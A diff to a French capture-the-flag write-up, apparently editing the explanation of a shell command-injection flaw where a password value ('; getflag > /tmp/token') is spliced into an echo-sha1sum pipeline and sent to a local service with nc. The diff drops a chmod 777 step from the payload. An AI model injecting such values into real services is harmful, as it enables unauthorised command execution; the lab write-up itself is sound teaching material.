@@ -23,10 +23,10 @@ end
 
 ## Vulnérabilité
 
-Si `pass = "; getflag > /tmp/token; chmod 777 /tmp/token"`, la commande devient :
+Si `pass = "; getflag > /tmp/token"`, la commande devient :
 
 ```sh
-echo ; getflag > /tmp/token; chmod 777 /tmp/token | sha1sum
+echo ; getflag > /tmp/token | sha1sum
 ```
 
 - `echo` s'exécute (sortie vide)
@@ -38,7 +38,7 @@ echo ; getflag > /tmp/token; chmod 777 /tmp/token | sha1sum
 
 ```sh
 nc 127.0.0.1 5151
-# Password: ; getflag > /tmp/token; chmod 777 /tmp/token
+# Password: ; getflag > /tmp/token
 ```
 
 Puis :
